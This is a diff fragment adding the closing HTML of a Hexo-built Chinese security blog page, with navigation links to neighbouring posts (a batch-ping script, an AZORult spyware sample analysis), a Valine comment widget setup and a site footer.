+              <a href="/2020/01/03/%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7-%E6%9C%AC%E5%9C%B0%E6%89%B9%E9%87%8Fping%E5%9F%9F%E5%90%8D%E8%84%9A%E6%9C%AC/">
+                  <i class="fa fa-angle-left" aria-hidden="true"></i>
+                  工具-本地批量ping域名脚本
+              </a>
+            
+        </div>
+        <div class="item right">
+            
+              <a href="/2019/11/23/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-AZORult%E9%97%B4%E8%B0%8D%E8%BD%AF%E4%BB%B6%E5%80%9F%E5%8A%A9%E9%82%AE%E4%BB%B6%E5%9C%A8%E9%87%8E%E4%BC%A0%E6%92%AD/">
+                样本分析-AZORult间谍软件借助邮件在野传播
+                <i class="fa fa-angle-right" aria-hidden="true"></i>
+              </a>
+            
+        </div>
+    </div>
+
+
+
+	<div id="vcomments"></div>
+
+
+<script>
+	
+		// 评论
+		new Valine({
+			av: AV,
+			el: '#vcomments',
+			notify: false,
+			verify: false,
+			path: window.location.pathname,
+			appId: '',
+			appKey: '',
+			placeholder: '请输入评论',
+			avatar: 'retro',
+			recordIP: false
+		})
+	
+	
+</script>
+	</div>
+	<div id="footer">
+	<p>
+	©2016-<span id="footerYear"></span> 
+	<a href="/">x7</a> 
+	
+	
+		|
+		<span id="busuanzi_container_site_pv">
+			pv
+			<span id="busuanzi_value_site_pv"></span>
+		</span>
+		|
+		<span id="busuanzi_container_site_uv"> 
+			uv
+			<span id="busuanzi_value_site_uv"></span>
+		</span>
+	
+	<br>
+	Theme <a href="//github.com/wujun234/hexo-theme-tree" target="_blank">Tree</a>
+	by <a href="//github.com/wujun234" target="_blank">WuJun</a>
+	Powered by <a href="//hexo.io" target="_blank">Hexo</a>
+	</p>
+</div>
+<script type="text/javascript"> 
+	document.getElementById('footerYear').innerHTML = new Date().getFullYear() + '';
+</script>
+	<button id="totop-toggle" class="toggle"><i class="fa fa-angle-double-up" aria-hidden="true"></i></button>
+</body>
+</html>
